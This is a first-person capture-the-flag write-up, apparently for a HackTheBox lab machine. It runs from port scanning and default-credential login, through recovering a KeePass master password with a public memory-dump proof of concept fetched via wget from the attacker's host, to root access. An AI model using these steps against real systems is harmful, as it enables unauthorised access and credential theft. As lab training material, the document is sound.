Firstly I eported the IP as an env variable and ran an 'nmap' port scan on all ports on the target 
machine.

** export IP=10.10.11.224
** nmap -n -Pn -p- $IP --open

Nmap scan report for 10.10.11.227
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

** nmap -n -Pn -p80,22 -sC -sV $IP

Nmap scan report for 10.10.11.227
Host is up (0.16s latency).

-- Exploitation walkthrough:
============================
As usual, since i dont have valid user creds for the SSH service running on the host, I will focus
on the web server.

Visiting the IP on my browser, i noticed there is a redirect to a domain that wasnt going through so
I added the domain and IP to my /etc/hosts file since it is using virtual hositng.

On accessing the domain 'http://tickets.keeper.htb' i was prsented with a login page. On manual 
inspection go the web [age i noticed a 'best practical solutions' being referenced.

A simple google search for default creds of 'best practicsl' got me to the dahsboard of the service.

On browsing the dahsboard, I noticed that there was a admin menu and under it were users. I clicked
it and i saw tow users, lnogaard and root.

In the comment section for user Lise Norgaard, his initial password was left in clear text. I copied
this and tested to login to the SSH service using this passwprd and username which i got in.

** New user. Initial password set to Welcome2023!

Now is to enumerate and escalate my privilege to root.

On doing my normal post-exploit enumeration, i found nothing on the host.

Now on inspecting the user's home directory, I could see a zip file, on unziping it, it outputed two
files, a .kdbx and a .dmp keypass file. 

It turns out that there is a windows app called keypass that helps manage passwords. To determine if 
this app can be used to escalate privs, I went back to the admin dashboard.

On inspecitng the history activity i see that the user sent a mail to admin saying he had an issue
with the password mamanger. This is a clear indication that we might be able to use it to escalate
our privs.

Next, I googled exploit for the keepass app and downloaded a POC. I was able to extract the clear
text master password (The initial password used to encrypt future passwords).

** https://github.com/CMEPW/keepass-dump-masterkey
** python3 -m http.server 8000
** wget http://10.10.11.20:8000/poc.py
** python3 poc.py -d KeePassDumpFull.dmp				Gives partial cleart text master pasword

Because the exploit doesnt give the full clear-text password, I had to guess it first two missing
chars wich is the polish meaning of a dessert as the user is polish himself.

On knowing this, I installed the linux cli tool for the keepass app 'kpcli', ran it, gave it the
master password and viewed all saved passwords in the '.kdbx' file.

** sudo apt install kpcli
** kpcli --kdb=mass.kdbx 				then give master keypass
** kpcli:/> stats
** kpcli:/> show -f 0
** kpcli:/> ls or cd

Among the saved passwords, is a putty private key (as seen in the host creds section above) which 
made me install putty on my kali and then I fed it with the private key and i got logged in as root.

** sudo apt install putty

Use the notes section for root as the private key to login as root via putty ssh client.

This is achieved by selecting connection => ssh => auth => credentials => select the priv key file
just created.

With this I log in as root and got my flag.
